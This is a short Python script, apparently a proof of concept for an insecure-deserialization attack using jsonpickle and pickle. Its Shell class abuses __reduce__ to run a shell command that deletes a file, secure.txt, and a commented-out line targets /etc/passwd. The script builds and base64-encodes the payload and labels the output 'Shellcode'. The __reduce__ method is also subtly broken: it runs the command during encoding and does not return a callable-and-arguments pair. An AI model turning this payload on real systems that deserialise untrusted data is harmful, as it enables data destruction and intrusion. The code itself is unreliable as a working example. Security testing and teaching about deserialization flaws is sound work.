import subprocess
import jsonpickle
import pickle
import sys
import base64


class Shell(object):
    def __reduce__(self):
        return subprocess.call(('rm', './secure.txt'), shell=True)
        # return subprocess.Popen, (('ls', '/etc/passwd'),)


class User(object):
    def __init__(self, user):
        self.username = user


def main():
    try:
        # Testing
        encoded = jsonpickle.encode((User("admin")))
        print("[*] Test: {0}".format(encoded))
        # Create encoded Pickle from Shell()
        encoded = jsonpickle.encode(Shell())
        b64 = base64.b64encode(encoded.encode())
        print("[*] Base64 Encoded: {0}".format(b64))
        print("[*] JSON encoded Pickle: {0}".format(encoded))
        print("[*] Reconstructing object from JSON Pickle ...")
        # Decode Pickle from JSON
        code = jsonpickle.decode(encoded)
        print("[*] Shellcode:\n {0}\n[*] Result ...".format(pickle.dumps(code)))
    except Exception as e:
        print("[!]")
        raise e


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
